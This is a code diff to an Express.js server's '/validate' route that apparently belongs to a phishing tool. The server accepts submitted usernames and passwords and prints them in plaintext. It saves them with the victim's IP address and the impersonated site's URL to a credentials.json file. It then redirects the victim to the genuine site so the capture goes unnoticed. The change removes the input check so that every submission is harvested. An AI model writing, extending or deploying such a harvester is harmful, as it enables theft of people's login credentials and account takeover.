@@ -96,26 +96,25 @@ app.get('/', function(request, response) {
 app.post('/validate', function(request, response) {
 	const username = request.body.username;
 	const password = request.body.password;
+	const site = request.body.originalSite
 	const ipAddr = request.headers['x-forwarded-for'] || request.connection.remoteAddress;
 	console.log(ipAddr + " Submitted.");
-	if (username && password) {
-		console.log("USERNAME: " + username);
-		console.log("PASSWORD: " + password);
-		addJSON(
-			path.resolve(path.join(__dirname, '../output/credentials.json')),
-			{
-				username: username,
-				password: password,
-				ip: ipAddr
-			}
-		)
+	console.log("USERNAME: " + username);
+	console.log("PASSWORD: " + password);
+	addJSON(
+		path.resolve(path.join(__dirname, '../output/credentials.json')),
+		{
+			site: site,
+			ip: ipAddr,
+			username: username,
+			password: password
+		}
+	)
 
-		response.redirect('/?valid=true')
-		response.end();
-	} else {
-		response.redirect('/?valid=false')
-		response.end();
+	if (request.body.redirect == "true") {
+		response.redirect(site)
 	}
+	response.end();
 });
 
 app.listen(args.port, '127.0.0.1', () => {
